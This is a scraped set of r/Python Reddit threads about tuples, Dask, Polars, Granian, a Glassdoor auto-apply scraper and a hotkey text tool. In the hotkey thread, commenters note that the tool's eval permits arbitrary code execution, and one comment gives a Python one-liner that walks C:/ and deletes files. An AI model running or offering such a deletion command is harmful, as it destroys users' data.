            "score": "5",
            "content": "Hey! I guess u may have already seen this but i have forked ur repo and added some changes to the code. I dunno those are simple changes but i do believe they make code much more redable and easy to edit in future. You may want to check it out. If so you can either go to ur repo and go to \"Forks\" section or follow this link here"
        }
    ]
},
{
    "post_author": "JosephLovesPython",
    "post_id": "1d9cfxq",
    "post_score": "27",
    "post_time": "Thursday, June 6, 2024 at 10:22:51 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Tuples Are Underrated! List vs Tuple 🐍",
    "media": [
        "https://youtu.be/-sO4FG6W4ho"
    ],
    "post_content": "Do you feel like you're underutilizing tuples in you code? Maybe cause you think lists are always the correct choice, and tuples don't have a place to exist.\nIn this video we will walk through the differences between lists and tuples, especially focusing on a difference very rarely discussed, albeit it being the most crucial one: the semantic. Following that we will elaborate how and when it is better to utilize either lists or tuples!\nAny feedback on the content would be highly appreciated ☺️\nhttps://youtu.be/-sO4FG6W4ho",
    "comments": [
        {
            "author": "Distinct_Errors",
            "score": "51",
            "content": "I mean, tuples can be hashed and lists can't. That seems like a pretty important use case right there...",
            "replies": [
                {
                    "author": "JosephLovesPython",
                    "score": "5",
                    "content": "You're absolutely right! This falls under the mutable vs immutable difference, but it definitely deserved to be mentioned explicitly. Thank you for the feedback :)",
                    "replies": [
                        {
                            "author": "JamzTyson",
                            "score": "27",
                            "content": "This falls under the mutable vs immutable difference Not really. Although hashable types are usually immutable, it is possible for an object to be both mutable and hashable. We don't usually want this because normally we expect that the hash value of an object does not change over its lifetime, and that the hash always refers to the same value. Nevertheless, it is technically possible for a custom class to be given a __hash__ method, making it hashable, even when instances are mutable.",
                            "replies": [
                                {
                                    "author": "axonxorz",
                                    "score": "7",
                                    "content": "It took nearly 20 years of python before I wrote my first __hash__, but you get your butt there is a massive \"THAR BE DRAGONS HERE\" warning on the method detailing the consistency guarantees"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "hotplasmatits",
            "score": "6",
            "content": "I use named tuples to define constants because they are immutable. I haven't seen a better way of making a constant a true constant in python."
        },
        {
            "author": "Lewistrick",
            "score": "3",
            "content": "I make a point of using tuples for every time I have a collection that is immutable."
        },
        {
            "author": "Working-Play7108",
            "score": "3",
            "content": "Very informative"
        },
        {
            "author": "RedEyed__",
            "score": "8",
            "content": "I always use tuples to store list inside /s"
        },
        {
            "author": "sausix",
            "score": "7",
            "content": "I like tuples too. But I've learned here to use lists for homogenic data types and tuples for heterogenic data. That's considered as pythonic. And typing supports that theory so you need this for homogenic tuples: tuple[str, ...] But it feels strange to use lists for constant data. You could use proxies to get a read only list. But that gets more complicated that just using a tuple."
        },
        {
            "author": "timwaaagh",
            "score": "4",
            "content": "For me its more like tuple vs class where class usually wins.",
            "replies": [
                {
                    "author": "TrainsareFascinating",
                    "score": "6",
                    "content": "Named tuples are your friend."
                }
            ]
        },
        {
            "author": "TheORIGINALkinyen",
            "score": "2",
            "content": "Fun fact...tuples are actually \"near\"-immutable. If a mutable collection (list, dict, etc) is an element in a tuple, you can change the individual collection elements. >>> tt = ([1, 2, 4], \"me\") >>> tt[0] [1, 2, 4] >>> tt[0][2]=3 >>> tt ([1, 2, 3], 'me') This seems like it would be useful but I can't think of a reason to actually do this :)"
        },
        {
            "author": "EternityForest",
            "score": "1",
            "content": "One advantage of tuples is they're immutable. Things that don't need to be mutable are often better off not being mutable"
        },
        {
            "author": "thefemtosecond",
            "score": "1",
            "content": "I say, Use tuples whenever you want to store data mostly just for the reason of having a collection. If you need to use operands on the collection I suggest using a list."
        }
    ]
},
{
    "post_author": "phofl93",
    "post_id": "1d7w21f",
    "post_score": "133",
    "post_time": "Tuesday, June 4, 2024 at 3:35:27 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Dask DataFrame is Fast Now!",
    "media": [
        "https://docs.coiled.io/blog/dask-dataframe-is-fast.html"
    ],
    "post_content": "My colleagues and I have been working on making Dask fast. It’s been fun. Dask DataFrame is now 20x faster and ~50% faster than Spark (but it depends a lot on the workload).\nI wrote a blog post on what we did: https://docs.coiled.io/blog/dask-dataframe-is-fast.html\nReally, this came down not to doing one thing really well, but doing lots of small things “pretty good”. Some of the most prominent changes include:\nApache Arrow support in pandas\nBetter shuffling algorithm for faster joins\nAutomatic query optimization\nThere are a bunch of other improvements too like copy-on-write for pandas 2.0 which ensures copies are only triggered when necessary, GIL fixes in pandas, better serialization, a new parquet reader, etc. We were able to get a 20x speedup on traditional DataFrame benchmarks.\nI’d love it if people tried things out or suggested improvements we might have overlooked.\nBlog post: https://docs.coiled.io/blog/dask-dataframe-is-fast.html",
    "comments": [
        {
            "author": "commenterzero",
            "score": "17",
            "content": "Glad to see dask coming along with its query engine optimizations."
        },
        {
            "author": "SerDrinksAlot",
            "score": "66",
            "content": "Obligatory polars > pandas comment",
            "replies": [
                {
                    "author": "spigotface",
                    "score": "10",
                    "content": "I just wish the Polars team would add informative exception messages.",
                    "replies": [
                        {
                            "author": "Benifactory",
                            "score": "6",
                            "content": "and fix the ungodly amount of unreachables and uncaught panics",
                            "replies": [
                                {
                                    "author": "Spleeeee",
                                    "score": "1",
                                    "content": "Plz elaborate?"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "34",
            "content": "The good old Swedish hello",
            "replies": [
                {
                    "author": "duppyconqueror81",
                    "score": "11",
                    "content": "The good old Swedish hello"
                }
            ]
        },
        {
            "author": "sciencewarrior",
            "score": "4",
            "content": "Query optimization feels like Deep Magic to me. Thanks for your hard work!"
        },
        {
            "author": "Oenomaus_3575",
            "score": "14",
            "content": "Idk why but I hate dask",
            "replies": [
                {
                    "author": "SimplyJif",
                    "score": "17",
                    "content": "Because it was terrible for so long and didn't live up to its own promises. Now there are so many other dataframe options that are fast and efficient that there's no reason to put up with Dask."
                },
                {
                    "author": "Looploop420",
                    "score": "7",
                    "content": "Why does everyone feel this way?"
                }
            ]
        },
        {
            "author": "amitsinghaks",
            "score": "12",
            "content": "It would be better if they can start working on running dask on top of polars instead of pandas"
        }
    ]
},
{
    "post_author": "buddly27",
    "post_id": "1d9lt4d",
    "post_score": "5",
    "post_time": "Thursday, June 6, 2024 at 7:04:41 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "CMake configs for Python modules (Pytest, Sphinx, …)",
    "media": [
        "https://sourcegraph.com/search?q=context:global+file:FindSphinx.cmake&patternType=standard&sm=1",
        "https://sourcegraph.com/search?q=context:global+file:CmakeLists.txt+sphinx-build&patternType=standard&sm=1",
        "https://lp.jetbrains.com/python-developers-survey-2022/",
        "https://github.com/python-cmake/sphinx-cmake",
        "https://github.com/python-cmake/pytest-cmake"
    ],
    "post_content": "As Python is one of the most popular languages, many C++ projects end up using Python bindings of some sort. Pytest and Sphinx are very popular frameworks, so many CMake modules have been written, and most projects end up including a copy of these modules or using some hardcoded paths.\nI wrote two Python packages to manage the installation and update of CMake configs for Pytest and Sphinx.\nhttps://github.com/python-cmake/pytest-cmake\nhttps://github.com/python-cmake/sphinx-cmake\nIt uses the pip package management, providing a module for each package and automatically generating a configuration based on the package version found.\n> pip install pytest-cmake\n> pip install sphinx-cmake\nI hope this method can standardize module integration for common Python tools.\nLet me know what you think!",
    "comments": []
},
{
    "post_author": "gi0baro",
    "post_id": "1d7rh4z",
    "post_score": "85",
    "post_time": "Tuesday, June 4, 2024 at 10:35:08 AM GMT+3",
    "flair_text": "News",
    "post_title": "Granian 1.4 is out",
    "media": [
        "https://github.com/emmett-framework/granian/releases/tag/v1.4.0",
        "https://polar.sh/emmett-framework/posts/granian-1-4",
        "https://github.com/emmett-framework/granian"
    ],
    "post_content": "Granian – the Rust HTTP server for Python applications – 1.4 was released!\nBlog post: https://polar.sh/emmett-framework/posts/granian-1-4\nRelease details: https://github.com/emmett-framework/granian/releases/tag/v1.4.0\nRepo: https://github.com/emmett-framework/granian",
    "comments": [
        {
            "author": "ducdetronquito",
            "score": "16",
            "content": "Congrats for the release; Granian looks like a very nice piece of software ! Since it offers a WSGI interface, I feel like it could replace uwsgi at work to run our django backend: I will try it in the following weeks to see how it behaves. Has anyone else succceded in running a Django backend on Granian ? :)",
            "replies": [
                {
                    "author": "knowsuchagency",
                    "score": "15",
                    "content": "Yeah it works great. I found it helped reduce the memory requirements on a couple apps keeping me in the free tier on Google Cloud Run. Highly recommend"
                },
                {
                    "author": "julianw",
                    "score": "5",
                    "content": "I used Granian 1.2 with my simple Django powered blog but unfortunately removed it because of memory leaks. I think they have been fixed in 1.3 but haven't checked back yet. For my use case Granian also used twice as much memory and workers to deliver half the RPS compared to uvicorn. YMMV of course but that's what I observed.",
                    "replies": [
                        {
                            "author": "gi0baro",
                            "score": "5",
                            "content": "Correct, it was fixed in 1.3.0 Regarding memory and RPS: Granian generally will use more memory compared to Uvicorn (as it will also run the Rust runtime), but from tests it should be in the 10-20% ratio, not twice as much. Also, versions prior to 1.2.3 had an issue with rust-python awaitables on Linux, which tended to cause performance issues in loading request bodies; 1.4 also introduced some changes in async runtime, so in general ASGI/WSGI performance should be improved compared to previous versions. It sounds strange to me you had to double up the number of workers, maybe you can share your configuration/launch command? If you could make another try with 1.4 it would be awesome! And feel also free to open up a discussion on the project repositories with your numbers, it is valuable to have data from real deployments, and also the community can help in tuning the configuration :)",
                            "replies": [
                                {
                                    "author": "LightShadow",
                                    "score": "1",
                                    "content": "Why were there memory leaks in a Rust-based program?"
                                }
                            ]
                        },
                        {
                            "author": "ducdetronquito",
                            "score": "1",
                            "content": "Thanks for your feedback !"
                        }
                    ]
                },
                {
                    "author": "gi0baro",
                    "score": "2",
                    "content": "Feel free to report your numbers/discoveries with a discussion in the project repository :) As I wrote in the blog post, with WSGI I strongly suggest to set an appropriate value for `backpressure` :)"
                }
            ]
        },
        {
            "author": "mincinashu",
            "score": "2",
            "content": "Does it work with pypy? Last I checked, this combo was crashing starlette's middleware.",
            "replies": [
                {
                    "author": "gi0baro",
                    "score": "1",
                    "content": "pypy wheels are available, but it's not widely used in Granian community at the moment. Feel free to make your tests and post issues/feedbacks on the project repo!"
                }
            ]
        },
        {
            "author": "New-Watercress1717",
            "score": "1",
            "content": "got benchmarks(vs other asgi servers)?",
            "replies": [
                {
                    "author": "gi0baro",
                    "score": "1",
                    "content": "https://github.com/emmett-framework/granian/blob/master/benchmarks/vs.md"
                }
            ]
        }
    ]
},
{
    "post_author": "harshi_bar",
    "post_id": "gpaegj",
    "post_score": "2881",
    "post_time": "Saturday, May 23, 2020 at 9:55:47 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I was tired of opening 100s of tabs for internship apps. So, I made an app to scrape and apply to every single job listing on Glassdoor with one click using Selenium! (source code and YT video linked below)",
    "media": [
        "https://external-preview.redd.it/D_LgeWc8DaIcza2G90u_tqHRn9KaRb7mkWao2qpO_oY.png?width=640&crop=smart&format=pjpg&auto=webp&s=7b066f4b81c3df71a5f8a630441d267f7c7a7b58"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "gbts_",
            "score": "643",
            "content": "Nice, but I imagine that one of Glassdoor's devs is going to have \"added a reCAPTCHA to the job application form\" on their resume pretty soon.",
            "replies": [
                {
                    "author": "DoggySnack",
                    "score": "367",
                    "content": "If companies want to waste our time putting up bogus listing for jobs they've already internally hired, I don't think this is unfair to do",
                    "replies": [
                        {
                            "author": "stacm614",
                            "score": "8",
                            "content": "I was about to make the point that if this was widely used, companies would just have way more horse shit to sift through. But good point."
                        },
                        {
                            "author": "[deleted]",
                            "score": "5",
                            "content": "Lost a job (promotion) to another internal hire after being told that i had the job and that the external interviews were a formality."
                        },
                        {
                            "author": "2211abir",
                            "score": "3",
                            "content": "It's unfair to those who apply manually."
                        }
                    ]
                },
                {
                    "author": "harshi_bar",
                    "score": "59",
                    "content": "I realized that if you re-run the script too many times, they'll actually put a CAPTCHA before showing the job listings. The application form itself, however, is hosted elsewhere (like Lever or Greenhouse), so those probably won't change."
                },
                {
                    "author": "mrObelixfromgaul",
                    "score": "21",
                    "content": "Can be solved, import sleep (20) click all the cars manually and go on"
                },
                {
                    "author": "Dizzybro",
                    "score": "35",
                    "content": "Ive seen github repos that solve captchas sooo",
                    "replies": [
                        {
                            "author": "seabass10x",
                            "score": "97",
                            "content": "They probably have a better success rate than I do too."
                        }
                    ]
                }
            ]
        },
        {
            "author": "rafaelmarques7",
            "score": "94",
            "content": "I did this two years ago with stackoverflow as the job database. I applied to over 400 jobs over two weeks and got 3 job offers. I thought it would be useful for othet people sp i also shared the github repo here at the time, but it was not well received for some reason. I really had fun doing the project though, and i would love to have used a broader job database so that mote people could use it, as stackoverflow is more limited to tech. Anyway, well done, it is a really cool project."
        },
        {
            "author": "L0ngp1nk",
            "score": "128",
            "content": "I like how you were basically writing your resume while applying for jobs."
        },
        {
            "author": "[deleted]",
            "score": "195",
            "content": "I've never understood why a company like Glassdoor or something doesn't tell companies to make their applications API friendly and then just have one application on Glassdoor that gets sent to the company over the API. It's insane that we still do things this way"
        }
    ]
},
{
    "post_author": "TwistedMinda",
    "post_id": "1d8754q",
    "post_score": "4",
    "post_time": "Tuesday, June 4, 2024 at 11:24:02 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "My little ChatGPT-Multimodal Server Starter",
    "media": [
        "https://github.com/TwistedMinda/desktoppy-server",
        "https://github.com/TwistedMinda/desktoppy-web"
    ],
    "post_content": "Please check out my Desktoppy Server.\nWhat My Project Does\nIt allows you to run your own personal AI on your computer, say bye-bye rate-limits and paywalls from mainstream AI's.\nIt uses ollama internally so you can use all the open-source Models but by default it's using:\nLLama3 for text-generation\nLLava for image recognition\nStable Diffusion 2 for image generation\nTarget Audience\nPerfect for new-comers... I wish I had this when I started tackling AI dev.\nI think it can be a good base to create your awesome AI-powered products!\nPlease let me know what you think about it!\nComparison \nIt differentiates from the other zillion starters by being very basic, allowing for full customization, and joining the 3 models together into 1 for a multi-modal feeling.\nEasiest possible setup, even for those who don't know the tools yet, all you need is Python3 installed on your PC. Basically a tutorial-starter-multimodal.\nMuch love\nLink: https://github.com/TwistedMinda/desktoppy-server\nThe very basic Web UI that goes along with it: https://github.com/TwistedMinda/desktoppy-web",
    "comments": []
},
{
    "post_author": "DIY_Maxwell",
    "post_id": "gizm2t",
    "post_score": "2536",
    "post_time": "Wednesday, May 13, 2020 at 5:01:59 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "With my limited knowledge in Python, I wrote a simple script to control my motorized microscope from a keyboard. All instructions are open-source. Just wanted to share with this community for possible comments and suggestions for further improvements.",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "LurkForever",
            "score": "131",
            "content": "Nice job! I also love the lego build animation towards the end :-)",
            "replies": [
                {
                    "author": "nowtayneicangetinto",
                    "score": "72",
                    "content": "\"simple python script\" - hey pretty neat LEGO animation - WHOA WTF WAS THAT?!",
                    "replies": [
                        {
                            "author": "xdcountry",
                            "score": "10",
                            "content": "Same reaction here"
                        }
                    ]
                },
                {
                    "author": "DIY_Maxwell",
                    "score": "55",
                    "content": "Thanks! I think the animations, whole documentation, and this stop-motion movie took more time than the project itself... glad hear that you liked it :-)",
                    "replies": [
                        {
                            "author": "samasamareddy",
                            "score": "11",
                            "content": ""
                        }
                    ]
                }
            ]
        },
        {
            "author": "DIY_Maxwell",
            "score": "48",
            "content": ""
        },
        {
            "author": "okasiyas",
            "score": "28",
            "content": "cries in print(“Hello world!”)"
        },
        {
            "author": "Hayvan-Boris",
            "score": "46",
            "content": "Aaand yesterday I got 200 errors while trying to script tic tac toe game 😬 congs bro good job 👍"
        },
        {
            "author": "normandantzig",
            "score": "7",
            "content": "I think this is really cool! Did you know there is now a 12 MP camera for the Raspberry Pi."
        },
        {
            "author": "[deleted]",
            "score": "4",
            "content": "this is really cool. mind sharing where you learn this stuff from?"
        },
        {
            "author": "ArmstrongBillie",
            "score": "3",
            "content": "That looks freakin awesome! Nice job!"
        },
        {
            "author": "__zaris",
            "score": "3",
            "content": "This looks really cool pal! Congratulations!"
        },
        {
            "author": "--0mn1-Qr330005--",
            "score": "3",
            "content": "Very impressive. The program and the build are phenomenal, not sure what suggestions I can give there. For visual aesthetic I would suggest cleaning up the wiring for the video & photos as it instantly gives it a visual improvement for the purpose of the demo, even if it is not feasible to always keep it clean. Actually, I can think of a suggestion. Have you considered building in some kind of auto focus? There are many image recognition packages available in python that might help streamline this process. It might also be useful to have automatic magnification presets so that manual control isn't always necessary. There's a lot of cool software only features possible with this build."
        }
    ]
},
{
    "post_author": "TechTalksWeekly",
    "post_id": "1dab3m7",
    "post_score": "98",
    "post_time": "Friday, June 7, 2024 at 4:46:10 PM GMT+3",
    "flair_text": "Resource",
    "post_title": " YouTube playlist with 100 most-watched Python 2023 conference talks",
    "media": [
        "https://www.reddit.com/r/python/",
        "https://www.youtube.com/playlist?list=PLsaeJ8d49kCnv20dizZqF_EjAoAByNfMj",
        "https://techtalksweekly.substack.com/",
        "https://techtalksweekly.substack.com/p/tech-talks-weekly-17"
    ],
    "post_content": "tldr; https://www.youtube.com/playlist?list=PLsaeJ8d49kCnv20dizZqF_EjAoAByNfMj\nlong: Hello r/python! As a part of Tech Talks Weekly newsletter, I've put together a list of the most watched Python conference talks from 2023 as a youtube playlist. The list is ordered by the view count for your convenience. The talks come from conferences like PyCon (all locations), PyData (all locations), EuroPython, Conf42, and many more to give you a complete overview of the landscape.\nI've built the playlist as a part of my newsletter called Tech Talks Weekly where once a week I send out all the recently uploaded tech conference talks across engineering conferences (see a recent issue and subscribe if this sounds useful).\nLet me know what do you think!",
    "comments": [
        {
            "author": "AlSweigart",
            "score": "10",
            "content": "#45, bay-bee! I think it was the joke I did at the start of the talk that got it so many views.",
            "replies": [
                {
                    "author": "ericjmorey",
                    "score": "1",
                    "content": "Is the blog post you referred to still being kept up to date as you discover new information?"
                }
            ]
        },
        {
            "author": "balder1993",
            "score": "2",
            "content": "This is the kind of contribution I love, thanks for it!"
        }
    ]
},
{
    "post_author": "commandlineluser",
    "post_id": "1d8mv0a",
    "post_score": "180",
    "post_time": "Wednesday, June 5, 2024 at 1:43:29 PM GMT+3",
    "flair_text": "News",
    "post_title": "Polars news: Faster CSV writer, dead expr elimination optimization, hiring engineers.",
    "media": [
        "https://pola.rs/posts/polars-in-aggregate-jun24/"
    ],
    "post_content": "Details about added features in the releases of Polars 0.20.17 to Polars 0.20.31\nhttps://pola.rs/posts/polars-in-aggregate-jun24/",
    "comments": [
        {
            "author": "Active_Peak7026",
            "score": "118",
            "content": "Polars is an amazing project and has completely replaced Pandas at my company. Well done Polars team",
            "replies": [
                {
                    "author": "BostonBaggins",
                    "score": "12",
                    "content": "Horrible exceptions handling. 😂 Your company got balls to completely jump ship like that 😂",
                    "replies": [
                        {
                            "author": "Active_Peak7026",
                            "score": "29",
                            "content": "It wasn't done in a day. Can you give an example of exception handling issues you've encountered in Polars? I'm truly interested to know.",
                            "replies": [
                                {
                                    "author": "LactatingBadger",
                                    "score": "46",
                                    "content": "Another person who is 100% on polars now. The exception handling issue comes from failures happening on rusts end. The high performance comes from an expectation that when you say data will be a certain type (or it’s look ahead inference said it would be), and you turn out to be wrong, it entirely shits the bed. When this happens, quite often wrapping it in a try/except block doesn’t do shit and it just does. Particularly annoying in a notebook context where earlier cells were expensive/involved network IO."
                                }
                            ]
                        },
                        {
                            "author": "spigotface",
                            "score": "2",
                            "content": "The exceptions that come out of Polars are often unintelligible and useless. I with they had better descriptive statements that actually tell you what's wrong."
                        }
                    ]
                },
                {
                    "author": "yrubooingmeimryte",
                    "score": "6",
                    "content": "Really? I like polars but most of the people at my company still prefer pandas. The syntax is just way more convenient for people who aren’t doing data science or some similar role full time."
                }
            ]
        },
        {
            "author": "El_Minadero",
            "score": "5",
            "content": "Any sense on the speed of numeric types compared to pandas?"
        },
        {
            "author": "Culpgrant21",
            "score": "1",
            "content": "Writing polars directly to snowflake would be helpful!",
            "replies": [
                {
                    "author": "LactatingBadger",
                    "score": "2",
                    "content": "Directly is hard, but if you convert it to an arrow dataset with zero copy, there are tools in snowpark/ the snowflake-python-connector for this. I have some slightly modified versions of the Dagster snowflake io manager which I misuse for this purpose"
                }
            ]
        },
        {
            "author": "gcdbiss",
            "score": "1",
            "content": "I love polars！"
        },
        {
            "author": "Oenomaus_3575",
            "score": "-18",
            "content": "",
            "replies": [
                {
                    "author": "yrubooingmeimryte",
                    "score": "13",
                    "content": "https://i.kym-cdn.com/entries/icons/facebook/000/039/237/i-don't-think-about-you-at-all.jpg"
                },
                {
                    "author": "j_tb",
                    "score": "6",
                    "content": "Can’t really give Polars a shot until they invest more in the Geo ecosystem and get GeoPolars close to feature parity with GeoPandas. DuckDB is killing it for most workloads I might consider switching for and has the bonus of SQL readability, strong Geo support etc."
                }
            ]
        },
        {
            "author": "sam-lb",
            "score": "-18",
            "content": ""
        }
    ]
},
{
    "post_author": "Beneficial-Ad-9243",
    "post_id": "1dazvjk",
    "post_score": "1",
    "post_time": "Saturday, June 8, 2024 at 1:27:15 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Introducing Zenaura, python framework for building scalable, maintainable component based SPAs.",
    "media": [
        "https://github.com/ARAldhafeeri/Zenaura",
        "https://araldhafeeri.github.io/zenaura-landing-page/",
        "https://araldhafeeri.github.io/Zenaura/"
    ],
    "post_content": "What My Project Does\nZenaura is a cutting-edge Python library, leveraging Pyodide and PyScript, designed to empower developers to create lightweight, performant, stateful, component-based Single Page Applications (SPAs) with ease. By utilizing a virtual DOM implementation, Zenaura enhances performance, reactivity, responsiveness, and interactivity, allowing developers to build dynamic web applications using familiar Python concepts and syntax.\nkey features\nExceptional Developer Experience: Intuitive and efficient development workflow.\nSmooth Learning Curve: Easy to learn and get started.\nModular Code Structure: Write clean, readable, and maintainable code.\nComponent-Based Architecture: Build reusable and scalable components.\nPage Management: Simplify page creation and navigation.\nBuilt-in Router: Seamless client-side routing.\nState and Props Management: Efficiently handle component states and properties.\nDependency Injection: Manage dependencies effortlessly.\nGlobal States and Components: Share states and components across the application.\nOptimized Virtual DOM: Enhance application performance with a highly efficient virtual DOM.\nComponent Lifecycle Methods: Control component behavior at different stages.\nForm Support: Easily manage form inputs and validation.\nAPI Integration: Integrate external APIs using the requests module.\ntarget Audience\nPython developers who want to build stateful, component based SPA using pure python.\nComparison with existing SPA building libraries, frameworks:\nPython Integration:\nLeverages PyScript and Pyodide: Zenaura allows your Python code to be compiled and transpiled into WebAssembly (WASM), enabling the execution of Python in the browser. This is a significant departure from traditional JavaScript-based frameworks like React, Angular, and Vue, which rely solely on JavaScript for client-side development.\nDeveloper Ecosystem:\nPythonic Development: Zenaura enables Python developers to build modern web applications without needing to switch to JavaScript, providing a seamless experience for those who are more comfortable with Python.\nUnified Language: By using Python for both front-end and back-end development, Zenaura reduces the context-switching overhead and allows for a more cohesive development experience.\nPerformance and Efficiency:\nVirtual DOM Implementation: Similar to React and Vue, Zenaura utilizes a virtual DOM to optimize rendering performance. However, Zenaura's implementation play more well with the virtual DOM as it update the real DOM in non-blocking asyn way. Also thanks to pydide the python interpreter is ported to WASM, which means less JS footprint , very light library sizes on every library developed around zenaura.\nComponent-Based Architecture:\nStateful Components: Zenaura's component-based architecture allows for building reusable, stateful components, akin to React and Vue. This promotes code reusability and modularity.\nEase of Learning and Use:\nSmooth Learning Curve: Zenaura offers an intuitive and straightforward learning path, especially for developers already familiar with Python. This makes it accessible and easy to adopt compared to the steeper learning curves of frameworks like Angular.\nEcosystem and Community:\nGrowing Python Ecosystem: By integrating with the Python ecosystem, Zenaura can leverage existing Python libraries and tools, providing a rich set of functionalities and a vibrant community for support and collaboration.\nResources:\nGitHub Repository: https://github.com/ARAldhafeeri/Zenaura\nLanding Page: https://araldhafeeri.github.io/zenaura-landing-page/\nDocumentation: https://araldhafeeri.github.io/Zenaura/",
    "comments": []
},
{
    "post_author": "AutoModerator",
    "post_id": "1d8c6yw",
    "post_score": "2",
    "post_time": "Wednesday, June 5, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Wednesday Daily Thread: Beginner questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "EdgySynchro",
            "score": "2",
            "content": "are the side panel resources upto date?"
        },
        {
            "author": "Random_Thought31",
            "score": "1",
            "content": "I have a .txt file that contains several lines of text (using the enter key to distinguish between lines). I want to display this text in a pygame window. It displays, but in place of the line returns, python displays a [?] symbol as if it cannot understand it. How can I fix this so that the [?] symbols are changed to \"/n\"?",
            "replies": [
                {
                    "author": "Jeffrey04",
                    "score": "1",
                    "content": "perhaps do this? '\\n'.join(text_file_content.splitlines()) to properly splitlines regardless how lines are ended, and then join them again with just newlines",
                    "replies": [
                        {
                            "author": "Random_Thought31",
                            "score": "1",
                            "content": "That still leaves the [?] symbols unfortunately. I will keep working on it."
                        },
                        {
                            "author": "Random_Thought31",
                            "score": "1",
                            "content": "I changed the code from '''text = open('begin.txt').read()''' to '''text = open('begin.txt').readlines()''' Now I don't get the one problem, but I do wind up not actually having anything print... Here's more of the snippet: ''' def write_lines(text): global GAP global WIDTH global font while text: print(len(text)) lines = split_text(text[0],font,WIDTH-43) print(lines) text.pop(0) line_height = GAP y = 20 for line in lines: text_surface = font.render(line, True, BLACK) text_rect = text_surface.get_rect(x=29,y=y) print(text_surface) print(text_rect) screen.blit(text_surface,text_rect) y += line_height while running: for event in pygame.event.get(): if event.type == pygame.QUIT: running = False draw_lines() write_lines(text) pygame.display.flip() clock.tick(60) pygame.quit() sys.exit() '''",
                            "replies": [
                                {
                                    "author": "Jeffrey04",
                                    "score": "1",
                                    "content": "you should probably try posting it to https://gist.github.com/ so it is formatted better, and the code block uses three backticks ` instead of quotes"
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    ]
},
{
    "post_author": "Slingerhd",
    "post_id": "arp3z9",
    "post_score": "2534",
    "post_time": "Monday, February 18, 2019 at 12:10:08 AM GMT+3",
    "flair_text": "",
    "post_title": "Lil cheatsheet",
    "media": [
        "https://preview.redd.it/e9he5yt327h21.jpg?width=640&crop=smart&auto=webp&s=a6b6a566627cfd6e9b806b7902a5c026cd3afeb0",
        "https://i.redd.it/e9he5yt327h21.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "comfortablybum",
            "score": "270",
            "content": "If you could go ahead and do this for all of Python.",
            "replies": [
                {
                    "author": "Slingerhd",
                    "score": "66",
                    "content": "Hahaha thats alot of work my friend",
                    "replies": [
                        {
                            "author": "SamyBencherif",
                            "score": "11",
                            "content": "but it's very pretty. so nice it would be to have a visual representation of our favorite serpentine programming language"
                        }
                    ]
                },
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "11",
                            "content": ""
                        },
                        {
                            "author": "cheddacheese148",
                            "score": "1",
                            "content": ""
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "82",
            "content": ""
        },
        {
            "author": "editor_of_the_beast",
            "score": "37",
            "content": "Honestly, if documentation were written this way I’d understand it way easier"
        },
        {
            "author": "needed_an_account",
            "score": "43",
            "content": "Really cool. r/penmanshipporn material too"
        },
        {
            "author": "Farconion",
            "score": "48",
            "content": "is every fucking post on this sub some sort of fucking \"tutorial\" or \"cheat sheet\""
        },
        {
            "author": "CodyBranner",
            "score": "23",
            "content": "I'd place boxes outside of the list and put arrows to them instead. This'd also explain references."
        },
        {
            "author": "moebaca",
            "score": "2",
            "content": "The title had me thinking this was something about a new rapper. Then I saw it was r/Python and realized how much that industry has dominated the 'Lil' prefix."
        },
        {
            "author": "insultingDuck",
            "score": "1",
            "content": "Great for when 'the dumbs' kick in, and I can't even remember my name anymore... Thank you. Can you make more of this, especially with name bonding examples?"
        },
        {
            "author": "bigt252002",
            "score": "1",
            "content": "Can you do one for classes?!"
        }
    ]
},
{
    "post_author": "dibs45",
    "post_id": "fbavjd",
    "post_score": "2881",
    "post_time": "Saturday, February 29, 2020 at 1:44:39 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Change text in place with custom hotkeys (Python Keyboard Listener)",
    "media": [
        "https://external-preview.redd.it/tMjbSDtkU8qToudzWiwXLmN8JBXNcnzuFZqLI4C0sn4.png?width=640&crop=smart&format=pjpg&auto=webp&s=68ac28cb4c5fca2ebc91bbc0e3781c77c573a5d5"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "gandalfx",
            "score": "277",
            "content": "That last one seems the most useful. Changing caps is already a feature in any good editor.",
            "replies": [
                {
                    "author": "dibs45",
                    "score": "169",
                    "content": "The idea is to use these in other applications besides editors. I do a lot of page building online and those apps don't have that functionality.",
                    "replies": [
                        {
                            "author": "gandalfx",
                            "score": "47",
                            "content": "That makes sense. Cool idea! Is it portable?"
                        }
                    ]
                },
                {
                    "author": "indiebryan",
                    "score": "41",
                    "content": "I wonder if I can write malicious code in my comment and have OP run it? Idk the limitations of python eval, is it like JavaScript eval?",
                    "replies": [
                        {
                            "author": "phail3d",
                            "score": "42",
                            "content": "Yes, Python eval basically means arbitrary code execution."
                        },
                        {
                            "author": "[deleted]",
                            "score": "22",
                            "content": "import os for root, dir, file in os.walk(“C:/”): os.remove(file)"
                        },
                        {
                            "author": "kevin_with_rice",
                            "score": "13",
                            "content": "That was my though too. Could lead to some really neat M E T A programming."
                        }
                    ]
                }
            ]
        },
        {
            "author": "Takiino",
            "score": "52",
            "content": "Could you please explain how you did it ?"
        },
        {
            "author": "phail3d",
            "score": "37",
            "content": "How does the evaluation work? If by calling eval, standard warnings apply. Edit: forgot to mention that this looks like a cool project :)"
        },
        {
            "author": "yeahduuuude",
            "score": "67",
            "content": "Great idea turned into a really usefull application 👍"
        },
        {
            "author": "VictorD02",
            "score": "31",
